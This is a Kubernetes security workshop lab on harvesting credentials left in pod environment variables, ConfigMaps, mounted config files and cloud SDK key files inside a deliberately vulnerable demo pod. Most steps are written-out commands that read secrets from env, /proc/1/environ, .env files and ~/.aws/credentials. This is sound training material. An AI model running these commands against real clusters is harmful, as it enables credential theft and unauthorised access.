# Application Credentials in Configuration Files

Developers frequently embed credentials directly into pod specs, ConfigMaps, or mounted files. An attacker with shell access to any container in the cluster can trivially harvest these credentials without any special privileges.

## Description

Developers store secrets in Kubernetes configuration files, such as environment variables in the pod specification, ConfigMaps, or files mounted from volumes. Such behavior is commonly seen in clusters monitored by Microsoft Defender for Cloud. Attackers who have access to those configurations — by querying the API server or by accessing those files on the developer's endpoint — can steal the stored secrets and use them.

Using those credentials, attackers may gain access to additional resources inside and outside the cluster, including databases, object storage, external APIs, and cloud provider control planes.

This technique covers four common credential exposure patterns:

1. **Plain-text environment variables** in the pod spec (`env` field directly in the container definition)
2. **ConfigMap-sourced environment variables** (`envFrom.configMapRef`)
3. **Secret-sourced environment variables** (`envFrom.secretRef`)
4. **Credentials in mounted files** (config files, `.env` files, JSON key files mounted as volumes)

## Prerequisites

- A running Kind cluster named `workshop-cluster`.
- `kubectl` installed and configured to connect to your cluster.

## Quick Start

### Step 1 - Deploy the vulnerable application

Deploy the demo application that exposes credentials through multiple vectors:

```bash
kubectl apply -f app-credentials.yaml
```

Wait for the pod to be ready:

```bash
kubectl get pods -l app=vulnerable-app
```

Expected output:

```
NAME                              READY   STATUS    RESTARTS   AGE
vulnerable-app-6d8f9b7c4d-xk2m9  1/1     Running   0          15s
```

### Step 2 - Get a shell inside the container

```bash
kubectl exec -it deploy/vulnerable-app -- /bin/sh
```

### Step 3 - Harvest credentials from environment variables

The most common finding. Dump all environment variables:

```bash
env
```

Expected output (abbreviated):

```
DB_HOST=postgres.prod.internal
DB_USER=app_user
DB_PASSWORD=Sup3rS3cr3tDBPass!
API_KEY=sk-prod-a1b2c3d4e5f6g7h8i9j0
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
STRIPE_SECRET_KEY=sk_live_51NxXXXXXXXXXXXXXX
```

Filter for interesting patterns:

```bash
env | grep -iE 'pass|secret|key|token|api|credential|auth|pwd'
```

### Step 4 - Read credentials from /proc for other processes

If multiple processes run in the container, or if you have access to a sidecar, you can read environment variables from the `/proc` filesystem for any running process:

```bash
# List all running processes
ls /proc | grep -E '^[0-9]+$'

# Read env vars for process with PID 1
cat /proc/1/environ | tr '\0' '\n'

# Filter for secrets
cat /proc/1/environ | tr '\0' '\n' | grep -iE 'pass|secret|key|token|api'
```

Expected output:

```
DB_PASSWORD=Sup3rS3cr3tDBPass!
API_KEY=sk-prod-a1b2c3d4e5f6g7h8i9j0
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

This technique works even when the environment variables belong to a different process than your current shell.

### Step 5 - Find credentials in mounted configuration files

Applications frequently mount configuration files containing credentials. Search common locations:

```bash
# Search for config files with credential keywords
find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.json" \
  -o -name "*.yaml" -o -name "*.yml" -o -name "*.env" -o -name ".env" \
  -o -name "*.properties" -o -name "*.ini" \) 2>/dev/null \
  | grep -v proc \
  | xargs grep -liE 'password|secret|key|token|credential' 2>/dev/null
```

Read the application config file mounted in this scenario:

```bash
cat /etc/app/config.json
```

Expected output:

```json
{
  "database": {
    "host": "postgres.prod.internal",
    "port": 5432,
    "user": "app_user",
    "password": "Sup3rS3cr3tDBPass!"
  },
  "external_api": {
    "endpoint": "https://api.payments.io",
    "api_key": "sk-prod-a1b2c3d4e5f6g7h8i9j0"
  }
}
```

Read the `.env` file:

```bash
cat /etc/app/.env
```

Expected output:

```
STRIPE_SECRET_KEY=sk_live_51NxXXXXXXXXXXXXXX
SENDGRID_API_KEY=SG.xxxxxxxxxxxxxxxxxxxx
```

### Step 6 - Check for cloud provider credential files

Cloud SDKs and tools leave credential files in well-known locations. Check for them:

```bash
# AWS credentials
cat ~/.aws/credentials 2>/dev/null
cat /root/.aws/credentials 2>/dev/null

# GCP service account key
find / -name "*.json" 2>/dev/null | xargs grep -l '"type": "service_account"' 2>/dev/null

# Azure service principal
cat /etc/kubernetes/azure.json 2>/dev/null
```

Read the GCP service account key mounted in this scenario:

```bash
cat /etc/gcp/service-account.json
```

Expected output (abbreviated):

```json
{
  "type": "service_account",
  "project_id": "prod-project-123456",
  "private_key_id": "abc123def456",
  "private_key": "-----BEGIN RSA PRIVATE KEY-----\n...",
  "client_email": "app-sa@prod-project-123456.iam.gserviceaccount.com"
}
```

### Step 7 - Query the API server for exposed ConfigMaps (from outside the pod)

Exit the pod and query the API server directly. ConfigMaps are not subject to RBAC audit scrutiny as often as Secrets, yet frequently contain credentials:

```bash
# List all ConfigMaps across namespaces
kubectl get configmaps --all-namespaces

# Describe the app config ConfigMap to see raw values
kubectl describe configmap app-config

# Get the raw YAML to see all data
kubectl get configmap app-config -o yaml
```

ConfigMaps have no base64 encoding — credentials are stored and displayed in plain text.

## Cleanup

```bash
kubectl delete -f app-credentials.yaml
```

## Resources

- [Kubernetes Secrets](https://kubernetes.io/docs/concepts/configuration/secret/)
- [Kubernetes ConfigMaps](https://kubernetes.io/docs/concepts/configuration/configmap/)
- [MITRE ATT&CK - Unsecured Credentials: Credentials in Files](https://attack.mitre.org/techniques/T1552/001/)
- [MITRE ATT&CK - Unsecured Credentials: Credentials in Environment Variables](https://attack.mitre.org/techniques/T1552/008/)
- [NSA Kubernetes Hardening Guide](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF)
